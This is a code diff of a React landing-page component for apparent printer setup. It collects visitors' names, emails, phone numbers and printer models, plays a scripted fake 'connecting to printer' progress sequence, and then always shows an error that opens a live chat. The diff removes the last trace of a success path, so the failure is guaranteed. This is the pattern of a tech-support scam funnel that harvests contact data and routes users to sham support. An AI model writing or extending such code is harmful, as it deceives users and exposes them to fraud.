@@ -10,11 +10,55 @@ export default function Hero() {
     printerModel: "",
   });
 
+  const [countryCode, setCountryCode] = useState("");
   const [showLoadingModal, setShowLoadingModal] = useState(false);
   const [showErrorModal, setShowErrorModal] = useState(false);
   const [loadingProgress, setLoadingProgress] = useState(0);
   const [loadingText, setLoadingText] = useState("Connecting to Printer...");
   const [isLoading, setIsLoading] = useState(false);
+
+  // Detect user country and set country code
+  useEffect(() => {
+    async function detectCountry() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        let code = "";
+
+        switch (data.country_code) {
+          case "GB":
+            code = "+44"; // UK
+            break;
+          case "AU":
+            code = "+61"; // Australia
+            break;
+          case "US":
+            code = "+1"; // USA
+            break;
+          case "NZ":
+            code = "+64"; // New Zealand
+            break;
+          case "IN":
+            code = "+91"; // India
+            break;
+          default:
+            code = "+1"; // Default to USA if unknown
+        }
+
+        setCountryCode(code);
+        setFormData((prev) => ({
+          ...prev,
+          phone: code + " ",
+        }));
+      } catch (err) {
+        console.error("Country detection failed:", err);
+        setCountryCode("+1");
+        setFormData((prev) => ({ ...prev, phone: "+1 " }));
+      }
+    }
+
+    detectCountry();
+  }, []);
 
   const handleChange = (e) => {
     setFormData({ ...formData, [e.target.name]: e.target.value });
@@ -23,12 +67,7 @@ export default function Hero() {
   const handleSubmit = async (e) => {
     e.preventDefault();
 
-    if (
-      !formData.name ||
-      !formData.email ||
-      !formData.phone ||
-      !formData.printerModel
-    ) {
+    if (!formData.name || !formData.email || !formData.phone || !formData.printerModel) {
       alert("Please fill in all fields before downloading.");
       return;
     }
@@ -42,18 +81,20 @@ export default function Hero() {
         body: JSON.stringify({
           name: formData.name,
           email: formData.email,
-          phone: formData.phone,
+          phone: formData.phone, // full phone with code
           printerModel: formData.printerModel,
         }),
       });
+
       setIsLoading(false);
       const data = await res.json();
+
       if (!res.ok || !data?.ok) {
-        alert(data?.error || "Something went wrong. Please try again.");
+        // data?.error || 
+        alert("Something went wrong. Please try again.");
         return;
       }
     } catch (err) {
-      console.error("API Error:", err);
       alert("Network error. Please try again.");
       return;
     }
@@ -62,9 +103,9 @@ export default function Hero() {
     setFormData({
       name: "",
       email: "",
-      phone: "",
-      printerModel: ""
-    })
+      phone: countryCode + " ",
+      printerModel: "",
+    });
     setShowLoadingModal(true);
     setLoadingProgress(0);
     setLoadingText("Connecting to Printer...");
@@ -82,16 +123,8 @@ export default function Hero() {
       });
     }, 150);
 
-    timeouts.push(
-      setTimeout(
-        () =>
-          setLoadingText("Joining the network and getting printer address..."),
-        1500
-      )
-    );
-    timeouts.push(
-      setTimeout(() => setLoadingText("Connected to printer network..."), 3000)
-    );
+    timeouts.push(setTimeout(() => setLoadingText("Joining the network and getting printer address..."), 1500));
+    timeouts.push(setTimeout(() => setLoadingText("Connected to printer network..."), 3000));
 
     const isSuccess = Math.random() > 0.4;
 
@@ -99,11 +132,7 @@ export default function Hero() {
       setTimeout(() => {
         clearInterval(intervalId);
         setShowLoadingModal(false);
-        if (isSuccess) {
-          setShowErrorModal(true);
-        } else {
-          setShowErrorModal(true);
-        }
+        setShowErrorModal(true);
       }, 7000)
     );
 
@@ -121,17 +150,17 @@ export default function Hero() {
   const openChat = () => {
     if (typeof window !== "undefined" && window.jivo_api) {
       window.jivo_api.open();
-      closeErrorModal()
+      closeErrorModal();
     }
   };
 
   const inputClass =
-    "w-full px-5 py-3 rounded-lg bg-white/90 border border-gray-200 text-gray-700 placeholder-gray-400 focus:ring-2 focus:ring-blue-400 outline-none";
+    "w-full px-5 py-3 rounded-lg bg-white/90 border border-gray-200 text-gray-700 placeholder-gray-600 focus:ring-2 focus:ring-blue-400 outline-none";
 
   return (
     <>
       {/* Hero Section */}
-      <section className="relative  bg-gradient-to-br from-blue-600 via-blue-700 to-blue-900 flex flex-col items-center justify-center overflow-hidden px-4 sm:px-6 md:px-10 py-4">
+      <section className="relative bg-gradient-to-br from-blue-600 via-blue-700 to-blue-900 flex flex-col items-center justify-center overflow-hidden px-4 sm:px-6 md:px-10 py-4">
         <div
           className="absolute inset-0 opacity-10"
           style={{
